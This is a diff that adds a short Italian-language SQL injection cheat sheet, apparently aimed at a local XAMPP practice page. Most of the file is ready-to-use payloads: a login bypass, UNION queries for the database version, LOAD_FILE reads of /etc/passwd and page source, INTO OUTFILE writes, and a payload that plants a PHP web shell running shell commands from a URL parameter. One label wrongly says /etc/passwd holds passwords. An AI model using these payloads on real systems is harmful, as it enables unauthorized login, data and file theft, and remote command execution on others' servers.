@@ -1,0 +1,41 @@
+1) Bypassare login
+
+username= ' OR 1=1 -- -
+password= [casuale]
+
+
+2) Attaccare 2 query (UNION)
+
+' UNION SELECT 1,2,3,4 -- -
+
+
+3) Vedere la verione del Database
+
+' UNION SELECT 1,2,3,@@version -- - 
+oppure
+' UNION SELECT 1,2,3,version() -- -
+
+
+4) Leggere un determinato file (nell'esempio '/etc/passwd', file di sistema di linux che contiene le password)
+
+' UNION SELECT LOAD_FILE('/etc/passwd'), 1, 2, 3 -- - 
+
+
+5) Leggere il file sorgente della pagina ('/opt/lampp/htdocs/' è la cartella di xampp in linux)
+
+' UNION SELECT 1, LOAD_FILE('/opt/lampp/htdocs/sqlinj/index.php'), 3, 4 -- - 
+
+
+6) Scrivere in un file (per esempio '/home/esempio.txt') la query
+
+' INTO OUTFILE '/home/esempio.txt' -- -
+
+
+7) Scrivere un file eseguibile via browser (ovvero salvarlo nella cartella htdocs di xampp)' 
+
+INTO OUTFILE /opt/lampp/htdocs/sqlinj/prova.txt' -- -
+
+
+8) Scrivere un file PHP che esegue codice da shell
+
+stringa casuale' UNION SELECT "", '<?php system($_GET[0]); ?>', "", "" INTO OUTFILE '/opt/lampp/htdocs/sqlinj/shell.php' -- - 
